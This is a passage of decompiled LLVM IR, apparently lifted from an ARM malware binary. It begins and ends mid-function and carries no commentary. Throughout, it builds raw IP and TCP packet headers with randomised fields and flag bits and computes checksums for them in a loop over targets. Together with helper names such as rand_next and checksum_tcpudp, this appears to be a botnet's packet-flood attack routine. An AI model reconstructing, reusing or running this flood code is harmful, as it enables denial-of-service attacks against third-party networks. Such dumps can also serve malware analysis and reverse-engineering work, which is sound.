  %v3_a48c = load i32, i32* %stack_var_-44, align 4
  %v5_a494 = mul i32 %v3_a48c, 24
  %v0_a49c = load i32, i32* @r4, align 4
  %v1_a49c = and i32 %v0_a49c, 16711680
  store i32 %v1_a49c, i32* %ip.global-to-local, align 4
  %v3_a4a0 = udiv i32 %v0_a49c, 16777216
  %v2_a4a4 = add i32 %v5_a494, %arg2
  store i32 %v2_a4a4, i32* %r1.global-to-local, align 4
  %v4_a4a8 = udiv i32 %v1_a49c, 256
  %v5_a4a8 = or i32 %v4_a4a8, %v3_a4a0
  store i32 %v5_a4a8, i32* %r2.global-to-local, align 4
  %v1_a4ac = and i32 %v0_a49c, 65280
  store i32 %v1_a4ac, i32* %r3.global-to-local, align 4
  %v1_a4b0 = add i32 %v2_a4a4, 20
  %v2_a4b0 = inttoptr i32 %v1_a4b0 to i8*
  %v3_a4b0 = load i8, i8* %v2_a4b0, align 1
  %v4_a4b0 = zext i8 %v3_a4b0 to i32
  store i32 %v4_a4b0, i32* %ip.global-to-local, align 4
  %v5_a4b8 = call i32 @llvm.bswap.i32(i32 %v0_a49c)
  %v7_a4bc = lshr i32 %v0_a488, %v4_a4b0
  %v8_a4bc = add i32 %v7_a4bc, %v5_a4b8
  store i32 %v8_a4bc, i32* %r2.global-to-local, align 4
  %v1_a4c0 = and i32 %v8_a4bc, 16711680
  store i32 %v1_a4c0, i32* %r0.global-to-local, align 4
  %v1_a4cc = and i32 %v8_a4bc, 65280
  store i32 %v1_a4cc, i32* %r1.global-to-local, align 4
  %v5_a4d4 = call i32 @llvm.bswap.i32(i32 %v8_a4bc)
  store i32 %v5_a4d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_a340

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_a340
  %v0_a4e0 = call i32 @rand_next()
  %v1_a4e0 = trunc i32 %v0_a4e0 to i16
  store i32 %v0_a4e0, i32* %r0.global-to-local, align 4
  store i32 %v2_a320, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_a364

dec_label_pc_a4f0:                                ; preds = %dec_label_pc_a40c
  %v3_a4f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a4f0, i32* @r4, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v5_a4f8 = mul i32 %v3_a4f0, 16
  %v6_a4f8 = add i32 %v5_a4f8, %v2_a0cc
  %v7_a4f8 = inttoptr i32 %v6_a4f8 to i32*
  store i32 %v0_a4f8, i32* %v7_a4f8, align 4
  %v0_a4fc = load i32, i32* @r8, align 4
  %v1_a4fc = add i32 %v0_a4fc, 4
  %v2_a4fc = inttoptr i32 %v1_a4fc to i32*
  %v3_a4fc = load i32, i32* %v2_a4fc, align 4
  store i32 %v3_a4fc, i32* %r1.global-to-local, align 4
  %v1_a508 = and i32 %v3_a4fc, 65280
  store i32 %v1_a508, i32* %r2.global-to-local, align 4
  store i32 %v2_a0cc, i32* %r0.global-to-local, align 4
  %v0_a518 = load i32, i32* @r4, align 4
  %v3_a518 = mul i32 %v0_a518, 16
  %v2_a51c = add i32 %v3_a518, %v2_a0cc
  store i32 %v2_a51c, i32* %ip.global-to-local, align 4
  %v5_a520 = call i32 @llvm.bswap.i32(i32 %v3_a4fc)
  store i32 %v5_a520, i32* %r3.global-to-local, align 4
  %v2_a524 = add i32 %v2_a51c, 4
  %v3_a524 = inttoptr i32 %v2_a524 to i32*
  store i32 %v5_a520, i32* %v3_a524, align 4
  %v0_a528 = load i32, i32* @r8, align 4
  %v1_a528 = add i32 %v0_a528, 8
  %v2_a528 = inttoptr i32 %v1_a528 to i32*
  %v3_a528 = load i32, i32* %v2_a528, align 4
  store i32 %v3_a528, i32* %r1.global-to-local, align 4
  %v1_a52c = and i32 %v3_a528, 16711680
  store i32 %v1_a52c, i32* %r0.global-to-local, align 4
  store i32 %v6_a250, i32* %r2.global-to-local, align 4
  %v5_a544 = call i32 @llvm.bswap.i32(i32 %v3_a528)
  store i32 %v5_a544, i32* %r3.global-to-local, align 4
  %v1_a548 = add i32 %v0_a528, 2
  %v2_a548 = inttoptr i32 %v1_a548 to i16*
  %v3_a548 = load i16, i16* %v2_a548, align 2
  %v4_a548 = zext i16 %v3_a548 to i32
  store i32 %v4_a548, i32* %r1.global-to-local, align 4
  store i32 %v1_a54c, i32* @r7, align 4
  %v0_a550 = load i32, i32* @lr, align 4
  %v1_a550 = trunc i32 %v0_a550 to i16
  %v2_a550 = load i32, i32* %ip.global-to-local, align 4
  %v3_a550 = add i32 %v2_a550, 14
  %v4_a550 = inttoptr i32 %v3_a550 to i16*
  store i16 %v1_a550, i16* %v4_a550, align 2
  %v0_a554 = load i32, i32* %r1.global-to-local, align 4
  %v1_a554 = trunc i32 %v0_a554 to i16
  %v2_a554 = load i32, i32* %ip.global-to-local, align 4
  %v3_a554 = add i32 %v2_a554, 12
  %v4_a554 = inttoptr i32 %v3_a554 to i16*
  store i16 %v1_a554, i16* %v4_a554, align 2
  %v0_a558 = load i32, i32* %r3.global-to-local, align 4
  %v1_a558 = load i32, i32* %ip.global-to-local, align 4
  %v2_a558 = add i32 %v1_a558, 8
  %v3_a558 = inttoptr i32 %v2_a558 to i32*
  store i32 %v0_a558, i32* %v3_a558, align 4
  %v0_a55c = load i32, i32* @r7, align 4
  store i32 %v0_a55c, i32* @r0, align 4
  %v0_a560 = call i32 @malloc()
  store i32 %v0_a560, i32* %r0.global-to-local, align 4
  store i32 %v2_a0dc, i32* %r3.global-to-local, align 4
  %v2_a56c = load i32, i32* @r4, align 4
  %v5_a56c = mul i32 %v2_a56c, 4
  %v6_a56c = add i32 %v5_a56c, %v2_a0dc
  %v7_a56c = inttoptr i32 %v6_a56c to i32*
  store i32 %v0_a560, i32* %v7_a56c, align 4
  %v3_a570 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a570, i32* %r2.global-to-local, align 4
  %v0_a574 = load i32, i32* %r3.global-to-local, align 4
  %v4_a574 = mul i32 %v3_a570, 4
  %v5_a574 = add i32 %v0_a574, %v4_a574
  %v6_a574 = inttoptr i32 %v5_a574 to i32*
  %v7_a574 = load i32, i32* %v6_a574, align 4
  store i32 %v7_a574, i32* @r4, align 4
  %v1_a578 = inttoptr i32 %v7_a574 to i8*
  %v2_a578 = load i8, i8* %v1_a578, align 1
  %tmp101 = urem i8 %v2_a578, 16
  %v1_a57c = zext i8 %tmp101 to i32
  %v1_a580 = or i32 %v1_a57c, 64
  store i32 %v1_a580, i32* %r3.global-to-local, align 4
  %v1_a584 = trunc i32 %v1_a580 to i8
  store i8 %v1_a584, i8* %v1_a578, align 1
  %v0_a588 = load i32, i32* @r4, align 4
  %v1_a588 = inttoptr i32 %v0_a588 to i8*
  %v2_a588 = load i8, i8* %v1_a588, align 1
  %v0_a58c = load i32, i32* @r7, align 4
  %tmp76 = mul i32 %v0_a58c, 256
  %v1_a594 = and i8 %v2_a588, -16
  %v1_a598 = or i8 %v1_a594, 5
  %v1_a59c = and i32 %tmp76, 65280
  %tmp77 = udiv i32 %v0_a58c, 256
  %v4_a5a0 = urem i32 %tmp77, 256
  %v5_a5a0 = or i32 %v4_a5a0, %v1_a59c
  store i32 %v5_a5a0, i32* %r2.global-to-local, align 4
  %v0_a5a4 = load i32, i32* @fp, align 4
  %v1_a5a4 = urem i32 %v0_a5a4, 256
  store i32 %v1_a5a4, i32* %r0.global-to-local, align 4
  store i32 %v1_a15c, i32* %ip.global-to-local, align 4
  %v3_a5ac = udiv i32 %v0_a5a4, 256
  store i32 %v3_a5ac, i32* %r1.global-to-local, align 4
  store i8 %v1_a598, i8* %v1_a588, align 1
  %v0_a5b4 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5b4 = load i32, i32* %r0.global-to-local, align 4
  %v4_a5b4 = mul i32 %v1_a5b4, 256
  %v5_a5b4 = or i32 %v4_a5b4, %v0_a5b4
  store i32 %v5_a5b4, i32* %r1.global-to-local, align 4
  store i32 %v6_a0f4, i32* %r0.global-to-local, align 4
  %v2_a5bc = load i32, i32* @r4, align 4
  %v3_a5bc = add i32 %v2_a5bc, 1
  %v4_a5bc = inttoptr i32 %v3_a5bc to i8*
  store i8 %v5_a114, i8* %v4_a5bc, align 1
  %v0_a5c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5c0 = trunc i32 %v0_a5c0 to i16
  %v2_a5c0 = load i32, i32* @r4, align 4
  %v3_a5c0 = add i32 %v2_a5c0, 4
  %v4_a5c0 = inttoptr i32 %v3_a5c0 to i16*
  store i16 %v1_a5c0, i16* %v4_a5c0, align 2
  %v0_a5c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_a5c4 = icmp eq i32 %v0_a5c4, 0
  store i1 %v2_a5c4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a150, i32* %r1.global-to-local, align 4
  %v0_a5cc = load i32, i32* %r2.global-to-local, align 4
  %v1_a5cc = trunc i32 %v0_a5cc to i16
  %v2_a5cc = load i32, i32* @r4, align 4
  %v3_a5cc = add i32 %v2_a5cc, 2
  %v4_a5cc = inttoptr i32 %v3_a5cc to i16*
  store i16 %v1_a5cc, i16* %v4_a5cc, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  br i1 %v2_a5c4, label %bb79, label %bb78

bb78:                                             ; preds = %dec_label_pc_a4f0
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_a4f0, %bb78
  %v0_a5d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a5d8 = trunc i32 %v0_a5d8 to i8
  %v2_a5d8 = load i32, i32* @r4, align 4
  %v3_a5d8 = add i32 %v2_a5d8, 8
  %v4_a5d8 = inttoptr i32 %v3_a5d8 to i8*
  store i8 %v1_a5d8, i8* %v4_a5d8, align 1
  %v0_a5dc = load i32, i32* %r3.global-to-local, align 4
  %v1_a5dc = trunc i32 %v0_a5dc to i8
  %v2_a5dc = load i32, i32* @r4, align 4
  %v3_a5dc = add i32 %v2_a5dc, 9
  %v4_a5dc = inttoptr i32 %v3_a5dc to i8*
  store i8 %v1_a5dc, i8* %v4_a5dc, align 1
  %v0_a5e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a5e0, label %bb81, label %bb80

bb80:                                             ; preds = %bb79
  %v1_a5e0 = load i32, i32* %r2.global-to-local, align 4
  %v2_a5e0 = trunc i32 %v1_a5e0 to i16
  %v3_a5e0 = load i32, i32* @r4, align 4
  %v4_a5e0 = add i32 %v3_a5e0, 6
  %v5_a5e0 = inttoptr i32 %v4_a5e0 to i16*
  store i16 %v2_a5e0, i16* %v5_a5e0, align 2
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  store i32 ptrtoint (i32* @global_var_24f78.59 to i32), i32* %r2.global-to-local, align 4
  %v2_a5e8 = load i32, i32* @global_var_24f78.59, align 4
  store i32 %v2_a5e8, i32* %r1.global-to-local, align 4
  %v1_a5ec = load i32, i32* @r4, align 4
  %v2_a5ec = add i32 %v1_a5ec, 12
  %v3_a5ec = inttoptr i32 %v2_a5ec to i32*
  store i32 %v2_a5e8, i32* %v3_a5ec, align 4
  %v3_a5f0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a5f0, i32* %r3.global-to-local, align 4
  store i32 %v2_a0cc, i32* %ip.global-to-local, align 4
  %v4_a5f8 = mul i32 %v3_a5f0, 16
  %v5_a5f8 = add i32 %v4_a5f8, %v2_a0cc
  %v6_a5f8 = inttoptr i32 %v5_a5f8 to i32*
  %v7_a5f8 = load i32, i32* %v6_a5f8, align 4
  store i32 %v7_a5f8, i32* %r2.global-to-local, align 4
  store i32 %v5_a5f8, i32* %r3.global-to-local, align 4
  %v1_a604 = load i32, i32* @r4, align 4
  %v2_a604 = add i32 %v1_a604, 16
  %v3_a604 = inttoptr i32 %v2_a604 to i32*
  store i32 %v7_a5f8, i32* %v3_a604, align 4
  %v0_a608 = load i32, i32* %r3.global-to-local, align 4
  %v1_a608 = add i32 %v0_a608, 12
  %v2_a608 = inttoptr i32 %v1_a608 to i16*
  %v3_a608 = load i16, i16* %v2_a608, align 2
  %v4_a608 = zext i16 %v3_a608 to i32
  store i32 %v4_a608, i32* %r0.global-to-local, align 4
  %v1_a60c = add i32 %v0_a608, 8
  %v2_a60c = inttoptr i32 %v1_a60c to i32*
  %v3_a60c = load i32, i32* %v2_a60c, align 4
  store i32 %v3_a60c, i32* %r1.global-to-local, align 4
  %v2_a610 = load i32, i32* @r4, align 4
  %v3_a610 = add i32 %v2_a610, 20
  %v4_a610 = inttoptr i32 %v3_a610 to i16*
  store i16 %v3_a608, i16* %v4_a610, align 2
  %v0_a614 = load i32, i32* @r4, align 4
  %v1_a614 = add i32 %v0_a614, 20
  store i32 %v1_a614, i32* @r8, align 4
  %v1_a618 = add i32 %v0_a614, 33
  %v2_a618 = inttoptr i32 %v1_a618 to i8*
  %v3_a618 = load i8, i8* %v2_a618, align 1
  %v4_a618 = zext i8 %v3_a618 to i32
  store i32 %v4_a618, i32* %r2.global-to-local, align 4
  %v0_a61c = load i32, i32* %r1.global-to-local, align 4
  %v2_a61c = add i32 %v0_a614, 24
  %v3_a61c = inttoptr i32 %v2_a61c to i32*
  store i32 %v0_a61c, i32* %v3_a61c, align 4
  %v0_a620 = load i32, i32* %r2.global-to-local, align 4
  %v1_a620 = or i32 %v0_a620, 1
  store i32 %v1_a620, i32* %r2.global-to-local, align 4
  %v0_a624 = load i32, i32* %r3.global-to-local, align 4
  %v1_a624 = add i32 %v0_a624, 4
  %v2_a624 = inttoptr i32 %v1_a624 to i32*
  %v3_a624 = load i32, i32* %v2_a624, align 4
  store i32 %v3_a624, i32* %r1.global-to-local, align 4
  %v1_a628 = add i32 %v0_a624, 14
  %v2_a628 = inttoptr i32 %v1_a628 to i16*
  %v3_a628 = load i16, i16* %v2_a628, align 2
  %v4_a628 = zext i16 %v3_a628 to i32
  store i32 %v4_a628, i32* %r3.global-to-local, align 4
  %v1_a62c = trunc i32 %v1_a620 to i8
  %v2_a62c = load i32, i32* @r8, align 4
  %v3_a62c = add i32 %v2_a62c, 13
  %v4_a62c = inttoptr i32 %v3_a62c to i8*
  store i8 %v1_a62c, i8* %v4_a62c, align 1
  %v0_a630 = load i32, i32* %r3.global-to-local, align 4
  %v1_a630 = trunc i32 %v0_a630 to i16
  %v2_a630 = load i32, i32* @r8, align 4
  %v3_a630 = add i32 %v2_a630, 2
  %v4_a630 = inttoptr i32 %v3_a630 to i16*
  store i16 %v1_a630, i16* %v4_a630, align 2
  %v0_a634 = load i32, i32* @r8, align 4
  %v1_a634 = add i32 %v0_a634, 12
  %v2_a634 = inttoptr i32 %v1_a634 to i8*
  %v3_a634 = load i8, i8* %v2_a634, align 1
  %v4_a634 = zext i8 %v3_a634 to i32
  store i32 %v4_a634, i32* %r3.global-to-local, align 4
  %v1_a638 = add i32 %v0_a634, 13
  %v2_a638 = inttoptr i32 %v1_a638 to i8*
  %v3_a638 = load i8, i8* %v2_a638, align 1
  %v4_a638 = zext i8 %v3_a638 to i32
  %tmp102 = urem i8 %v3_a634, 16
  %v1_a63c = zext i8 %tmp102 to i32
  %v1_a640 = or i32 %v1_a63c, 128
  store i32 %v1_a640, i32* %r3.global-to-local, align 4
  %v1_a644 = or i32 %v4_a638, 16
  store i32 %v1_a644, i32* %r2.global-to-local, align 4
  %v0_a648 = load i32, i32* %r1.global-to-local, align 4
  %v2_a648 = add i32 %v0_a634, 8
  %v3_a648 = inttoptr i32 %v2_a648 to i32*
  store i32 %v0_a648, i32* %v3_a648, align 4
  %v0_a64c = load i32, i32* %r3.global-to-local, align 4
  %v1_a64c = trunc i32 %v0_a64c to i8
  %v2_a64c = load i32, i32* @r8, align 4
  %v3_a64c = add i32 %v2_a64c, 12
  %v4_a64c = inttoptr i32 %v3_a64c to i8*
  store i8 %v1_a64c, i8* %v4_a64c, align 1
  %v0_a650 = load i32, i32* %r2.global-to-local, align 4
  %v1_a650 = trunc i32 %v0_a650 to i8
  %v2_a650 = load i32, i32* @r8, align 4
  %v3_a650 = add i32 %v2_a650, 13
  %v4_a650 = inttoptr i32 %v3_a650 to i8*
  store i8 %v1_a650, i8* %v4_a650, align 1
  %v0_a654 = call i32 @rand_next()
  %v1_a654 = trunc i32 %v0_a654 to i16
  store i32 %v0_a654, i32* %r0.global-to-local, align 4
  store i32 %v1_a198, i32* %r1.global-to-local, align 4
  %v0_a65c = load i32, i32* @r8, align 4
  %v1_a65c = add i32 %v0_a65c, 13
  %v2_a65c = inttoptr i32 %v1_a65c to i8*
  %v3_a65c = load i8, i8* %v2_a65c, align 1
  %v4_a65c = zext i8 %v3_a65c to i32
  store i32 %v1_a660, i32* %r2.global-to-local, align 4
  %v1_a664 = and i32 %v4_a65c, 223
  %v5_a668 = or i32 %v1_a664, %v4_a668
  store i32 %v5_a668, i32* %r3.global-to-local, align 4
  %v1_a66c = trunc i32 %v5_a668 to i8
  store i8 %v1_a66c, i8* %v2_a65c, align 1
  store i32 %v1_a1b8, i32* %ip.global-to-local, align 4
  %v0_a674 = load i32, i32* @r8, align 4
  %v1_a674 = add i32 %v0_a674, 13
  %v2_a674 = inttoptr i32 %v1_a674 to i8*
  %v3_a674 = load i8, i8* %v2_a674, align 1
  %v4_a674 = zext i8 %v3_a674 to i32
  store i32 %v1_a678, i32* %r3.global-to-local, align 4
  %v1_a67c = and i32 %v4_a674, 239
  %v5_a680 = or i32 %v1_a67c, %v4_a680
  store i32 %v5_a680, i32* %r2.global-to-local, align 4
  %v1_a684 = trunc i32 %v5_a680 to i8
  store i8 %v1_a684, i8* %v2_a674, align 1
  store i32 %v1_a1d8, i32* %r1.global-to-local, align 4
  %v0_a68c = load i32, i32* @r8, align 4
  %v1_a68c = add i32 %v0_a68c, 13
  %v2_a68c = inttoptr i32 %v1_a68c to i8*
  %v3_a68c = load i8, i8* %v2_a68c, align 1
  %v4_a68c = zext i8 %v3_a68c to i32
  store i32 %v1_a690, i32* %r2.global-to-local, align 4
  %v1_a694 = and i32 %v4_a68c, 247
  %v5_a698 = or i32 %v1_a694, %v4_a698
  store i32 %v5_a698, i32* %r3.global-to-local, align 4
  %v1_a69c = trunc i32 %v5_a698 to i8
  store i8 %v1_a69c, i8* %v2_a68c, align 1
  store i32 %v1_a1f8, i32* %ip.global-to-local, align 4
  %v0_a6a4 = load i32, i32* @r8, align 4
  %v1_a6a4 = add i32 %v0_a6a4, 13
  %v2_a6a4 = inttoptr i32 %v1_a6a4 to i8*
  %v3_a6a4 = load i8, i8* %v2_a6a4, align 1
  %v4_a6a4 = zext i8 %v3_a6a4 to i32
  store i32 %v1_a6a8, i32* %r3.global-to-local, align 4
  %v1_a6ac = and i32 %v4_a6a4, 251
  %v5_a6b0 = or i32 %v1_a6ac, %v4_a6b0
  store i32 %v5_a6b0, i32* %r2.global-to-local, align 4
  %v1_a6b4 = trunc i32 %v5_a6b0 to i8
  store i8 %v1_a6b4, i8* %v2_a6a4, align 1
  store i32 %v1_a218, i32* %r1.global-to-local, align 4
  %v0_a6bc = load i32, i32* @r8, align 4
  %v1_a6bc = add i32 %v0_a6bc, 13
  %v2_a6bc = inttoptr i32 %v1_a6bc to i8*
  %v3_a6bc = load i8, i8* %v2_a6bc, align 1
  %v4_a6bc = zext i8 %v3_a6bc to i32
  store i32 %v1_a6c0, i32* %r2.global-to-local, align 4
  %v1_a6c4 = and i32 %v4_a6bc, 253
  %v4_a6c8 = or i32 %v1_a6c4, %v3_a6c8
  store i32 %v4_a6c8, i32* %r3.global-to-local, align 4
  %v1_a6cc = trunc i32 %v4_a6c8 to i8
  store i8 %v1_a6cc, i8* %v2_a6bc, align 1
  store i32 %v1_a238, i32* %ip.global-to-local, align 4
  %v0_a6d4 = load i32, i32* @r8, align 4
  %v1_a6d4 = add i32 %v0_a6d4, 13
  %v2_a6d4 = inttoptr i32 %v1_a6d4 to i8*
  %v3_a6d4 = load i8, i8* %v2_a6d4, align 1
  %v4_a6d4 = zext i8 %v3_a6d4 to i32
  %v1_a6dc = and i32 %v4_a6d4, 254
  store i32 %v1_a6dc, i32* %r2.global-to-local, align 4
  %v2_a6e0 = or i32 %v1_a6dc, %v1_a6d8
  store i32 %v2_a6e0, i32* %r3.global-to-local, align 4
  %v1_a6e4 = trunc i32 %v2_a6e0 to i8
  store i8 %v1_a6e4, i8* %v2_a6d4, align 1
  %v3_a6e8 = load i32, i32* @r8, align 4
  %v4_a6e8 = add i32 %v3_a6e8, 14
  %v5_a6e8 = inttoptr i32 %v4_a6e8 to i16*
  store i16 %v1_a654, i16* %v5_a6e8, align 2
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %v0_a6f0 = load i32, i32* @r4, align 4
  %v1_a6f0 = add i32 %v0_a6f0, 40
  store i32 %v1_a6f0, i32* %r0.global-to-local, align 4
  %v2_a6f4 = inttoptr i32 %v1_a6f0 to i16*
  %v3_a6f4 = call i32 @rand_str(i16* %v2_a6f4, i32 %v6_a250)
  store i32 %v3_a6f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a448

dec_label_pc_a6fc:                                ; preds = %dec_label_pc_a2bc
  store i32 %v6_a250, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_a250, 40
  br label %dec_label_pc_a70c

dec_label_pc_a70c:                                ; preds = %dec_label_pc_a45c, %dec_label_pc_a6fc
  %storemerge6.pre-phi = phi i32 [ %v1_a54c, %dec_label_pc_a45c ], [ %.pre, %dec_label_pc_a6fc ]
  %v0_a72026 = phi i32 [ %v1_a450, %dec_label_pc_a45c ], [ 0, %dec_label_pc_a6fc ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_a250, 65536
  %storemerge = add i32 %v6_a250, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_a70c = add i32 %storemerge4, 1310720
  store i32 %v1_a70c, i32* %r2.global-to-local, align 4
  %tmp82 = udiv i32 %v1_a70c, 256
  %v3_a714 = and i32 %tmp82, 65280
  store i32 %v3_a714, i32* %r3.global-to-local, align 4
  %v4_a718 = udiv i32 %v1_a70c, 16777216
  %v5_a718 = or i32 %v3_a714, %v4_a718
  store i32 %v5_a718, i32* @r8, align 4
  %v2_a844 = icmp eq i32 %v1_a270, 0
  br label %dec_label_pc_a71c

dec_label_pc_a71c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828, %dec_label_pc_a70c
  %v0_a720 = phi i32 [ %v0_a72026, %dec_label_pc_a70c ], [ 0, %dec_label_pc_a828 ], [ 0, %dec_label_pc_a71c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a720 = icmp eq i32 %v0_a720, 0
  store i1 %v2_a720, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a720, label %dec_label_pc_a71c, label %dec_label_pc_a72c

dec_label_pc_a72c:                                ; preds = %dec_label_pc_a71c, %dec_label_pc_a828
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a730

dec_label_pc_a730:                                ; preds = %dec_label_pc_a758, %dec_label_pc_a72c
  %v1_a738 = phi i32 [ %v1_a818, %dec_label_pc_a758 ], [ 0, %dec_label_pc_a72c ]
  store i32 %v2_a0dc, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10000.57 to i32), i32* %r3.global-to-local, align 4
  %v4_a738 = mul i32 %v1_a738, 4
  %v5_a738 = add i32 %v4_a738, %v2_a0dc
  %v6_a738 = inttoptr i32 %v5_a738 to i32*
  %v7_a738 = load i32, i32* %v6_a738, align 4
  store i32 %v7_a738, i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1), i32* %r3.global-to-local, align 4
  %v0_a740 = load i32, i32* @fp, align 4
  %v9_a740 = icmp eq i32 %v0_a740, add (i32 ptrtoint (i32* @global_var_10000.57 to i32), i32 -1)
  store i1 %v9_a740, i1* %cpsr_z.global-to-local, align 1
  %v1_a744 = add i32 %v7_a738, 20
  store i32 %v1_a744, i32* @r5, align 4
  br i1 %v9_a740, label %dec_label_pc_a83c, label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a730
  store i32 %v1_a270, i32* %r3.global-to-local, align 4
  store i1 %v2_a844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a844, label %dec_label_pc_a758, label %dec_label_pc_a850

dec_label_pc_a758:                                ; preds = %dec_label_pc_a74c, %dec_label_pc_a83c, %dec_label_pc_a850
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_a75c = load i32, i32* @r4, align 4
  %v3_a75c = add i32 %v2_a75c, 10
  %v4_a75c = inttoptr i32 %v3_a75c to i16*
  store i16 0, i16* %v4_a75c, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a764 = load i32, i32* @r4, align 4
  store i32 %v0_a764, i32* @r0, align 4
  %v2_a768 = call i32 @checksum_generic(i32 %v0_a764, i32 20)
  %v3_a768 = trunc i32 %v2_a768 to i16
  store i32 %v2_a768, i32* %r0.global-to-local, align 4
  %v3_a76c = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_a0cc, i32* %r2.global-to-local, align 4
  %v3_a774 = mul i32 %v3_a76c, 16
  %v2_a778 = add i32 %v3_a774, %v2_a0cc
  store i32 %v2_a778, i32* %r1.global-to-local, align 4
  %v1_a77c = add i32 %v2_a778, 4
  %v2_a77c = inttoptr i32 %v1_a77c to i32*
  %v3_a77c = load i32, i32* %v2_a77c, align 4
  %v3_a780 = mul i32 %v3_a77c, 65536
  store i32 %v3_a780, i32* %ip.global-to-local, align 4
  %tmp83 = mul i32 %v3_a77c, 256
  %v1_a788 = and i32 %tmp83, 65280
  %tmp84 = udiv i32 %v3_a77c, 256
  %v4_a78c = urem i32 %tmp84, 256
  %v5_a78c = or i32 %v4_a78c, %v1_a788
  store i32 %v5_a78c, i32* %r3.global-to-local, align 4
  %v1_a790 = add i32 %v3_a77c, 1
  store i32 %v1_a790, i32* %r2.global-to-local, align 4
  store i32 %v1_a790, i32* %v2_a77c, align 4
  %v0_a798 = load i32, i32* %r3.global-to-local, align 4
  %v1_a798 = load i32, i32* @r5, align 4
  %v2_a798 = add i32 %v1_a798, 4
  %v3_a798 = inttoptr i32 %v2_a798 to i32*
  store i32 %v0_a798, i32* %v3_a798, align 4
  %v0_a79c = load i32, i32* %r1.global-to-local, align 4
  %v1_a79c = add i32 %v0_a79c, 8
  %v2_a79c = inttoptr i32 %v1_a79c to i32*
  %v3_a79c = load i32, i32* %v2_a79c, align 4
  %tmp85 = mul i32 %v3_a79c, 256
  %v1_a7a8 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_a79c, 256
  %v4_a7ac = urem i32 %tmp86, 256
  %v5_a7ac = or i32 %v4_a7ac, %v1_a7a8
  %v1_a7b0 = load i32, i32* @r5, align 4
  %v2_a7b0 = add i32 %v1_a7b0, 8
  %v3_a7b0 = inttoptr i32 %v2_a7b0 to i32*
  store i32 %v5_a7ac, i32* %v3_a7b0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a7b8 = load i32, i32* @r4, align 4
  %v4_a7b8 = add i32 %v3_a7b8, 10
  %v5_a7b8 = inttoptr i32 %v4_a7b8 to i16*
  store i16 %v3_a768, i16* %v5_a7b8, align 2
  %v0_a7bc = load i32, i32* @r5, align 4
  store i32 %v0_a7bc, i32* @r1, align 4
  %v0_a7c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a7c0 = trunc i32 %v0_a7c0 to i16
  %v3_a7c0 = add i32 %v0_a7bc, 16
  %v4_a7c0 = inttoptr i32 %v3_a7c0 to i16*
  store i16 %v1_a7c0, i16* %v4_a7c0, align 2
  %v0_a7c4 = load i32, i32* @r8, align 4
  store i32 %v0_a7c4, i32* %r2.global-to-local, align 4
  %v0_a7c8 = load i32, i32* @sl, align 4
  store i32 %v0_a7c8, i32* %r3.global-to-local, align 4
  %v0_a7cc = load i32, i32* @r4, align 4
  store i32 %v0_a7cc, i32* %r0.global-to-local, align 4
  %v4_a7d0 = call i32 @checksum_tcpudp(i32 %v0_a7cc, i32 %v0_a7bc, i32 %v0_a7c4, i32 %v0_a7c8)
  %v5_a7d0 = trunc i32 %v4_a7d0 to i16
  store i32 %v4_a7d0, i32* %r0.global-to-local, align 4
  %v3_a7d4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a7d4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_a7dc = mul i32 %v3_a7d4, 32
  store i32 %v3_a7dc, i32* %lr.global-to-local, align 4
  %v3_a7e0 = load i32, i32* @r5, align 4
  %v4_a7e0 = add i32 %v3_a7e0, 16
  %v5_a7e0 = inttoptr i32 %v4_a7e0 to i16*
  store i16 %v5_a7d0, i16* %v5_a7e0, align 2
  %v0_a7e4 = load i32, i32* %lr.global-to-local, align 4
  %v1_a7e4 = load i32, i32* %r3.global-to-local, align 4
  %tmp103 = mul i32 %v1_a7e4, -8
  %v5_a7e4 = add i32 %v0_a7e4, %tmp103
  store i32 %v5_a7e4, i32* %lr.global-to-local, align 4
  %v0_a7e8 = load i32, i32* @r5, align 4
  %v1_a7e8 = add i32 %v0_a7e8, 2
  %v2_a7e8 = inttoptr i32 %v1_a7e8 to i16*
  %v3_a7e8 = load i16, i16* %v2_a7e8, align 2
  %v4_a7e8 = zext i16 %v3_a7e8 to i32
  store i32 %v4_a7e8, i32* @r5, align 4
  %v1_a7ec = load i32, i32* %ip.global-to-local, align 4
  %v2_a7ec = add i32 %v1_a7ec, %v5_a7e4
  store i32 %v2_a7ec, i32* @lr, align 4
  %v3_a7f0 = add i32 %v2_a7ec, 2
